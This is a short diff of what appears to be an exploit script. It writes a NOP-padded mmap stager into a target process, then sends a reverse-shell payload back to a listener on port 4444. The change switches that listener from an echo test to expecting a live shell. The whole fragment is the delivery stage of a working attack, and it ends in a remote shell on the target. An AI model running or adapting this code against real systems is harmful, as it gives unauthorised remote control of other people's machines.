@@ -33,5 +33,5 @@ buf += sc.nopfill(sc.mmap_stager(), 400, buf)
 
 p.write(buf)
 p.write_p64(0)
-with p.listen(4444, echotest=True) as (host, port):
+with p.listen(4444, is_shell=True) as (host, port):
     p.write(sc.reverse_shell(host, port))
